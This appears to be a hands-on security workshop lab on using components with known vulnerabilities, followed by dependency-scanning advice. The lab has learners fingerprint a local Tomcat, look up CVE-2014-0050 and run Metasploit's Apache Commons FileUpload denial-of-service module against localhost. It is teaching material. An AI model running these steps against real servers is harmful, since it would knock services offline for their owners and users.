# Using Components with Known Vulnerabilities

We are lucky in the Java world that we don't depend on many 3rd party libraries. Yeah right!!! Projects often contain dozens if not hundreds of 3rd party jars. Using components with known vulnerabilites can make your application succeptable to exploitation. [Equifax and Struts](https://www.komando.com/happening-now/418420/how-to-check-if-your-personal-data-exposed-in-equifax-breach) anybody?

## Metasploit

1. Shutdown Spring Boot version of Wordy Ninja Blog.

2. Change directory to Apache Tomcat containing deployed version of Wordy Ninja Blog war.

```
cd cd ~/workspaces/apache-tomcat-8.0.1/ 
```

3. Start Tomcat.

```
bin/startup.sh
```

4. Visit [http://localhost:9090](http://localhost:9090) to make sure it is up.

5. Determine the version of tomcat running as if you were a hacker.

HINT: http://localhost:9090/docs/

6. Determine vulnerabilities for that specific version of Tomcat.

HINT: Google, http://cve.mitre.org/ or http://www.cvedetails.com/
HINT: https://www.cvedetails.com/cve/CVE-2014-0050/

7. Once you know the vulnerabilities that exist, use the CVE number to determine if you can exploit it.

HINT: Google CVE number
HINT: https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_commons_fileupload_dos

8. In a new terminal window run top to determine how much CPU Tomcat/java is using.

NOTE: It maybe so small it might not even show up in the list.

9. In yet another new terminal window, launch Metasploit.

```
msfconsole
```

10. In the Metasploit console, tell it to use the module found earlier.

```
use auxiliary/dos/http/apache_commons_fileupload_dos
```

11. Show the actions for the module

```
show actions
```

In the case of this module, there is only the one default so nothing shows up in the list.

12. Show the options for the module.

```
show options
```

NOTE: we need to set the RHOST or the host we are going to attack to localhost and we need to change port to 9090 since that is the port Tomcat is listening on. Finally, the attack usually works between 50-100 requests so you can either run it twice or up the RLIMIT.

13. Set options.

```
set RHOST localhost
set RPORT 9090
```

14. Run module.

```
run
```

What happened to the Tomcat/java CPU? Is the website still accessible? If so, run it a couple more times and check again. Is the 50-200 requests enough for your monitoring to catch it?

15. Kill Tomcat.

```
kill -9 <pid>
```

## App Scan

How do you determine which libraries you may be using are vulnerable? You can scan the libraries.

1. Visit https://www.sonatype.com/appscan.

2. Register and download the scanning app.

3. Scan the Wordy Ninja Blog war or your own application jar/war. 

NOTE: Don't worry, the scanner only generates a hash from the artifacts and sends it back to Sonatype for comparison with their database. It does not provide  Sonatype access to your artifacts or source code.

4. Wait 24 hours for report.

5. Analyse report for vulnerabilities and licensing.

## Observations

* Keeping up with CVEs can take a lot of time. That's what interns are for. Just kidding.
* Scanning dependences or reviewing CVEs can produce false positives so take them with a grain of salt and validate. You may not be exposing the library or feature with the vulnerability.

## Solutions

* [Sonatype Appscan](https://www.sonatype.com/appscan)
* [Dependency Check](https://jeremylong.github.io/DependencyCheck/)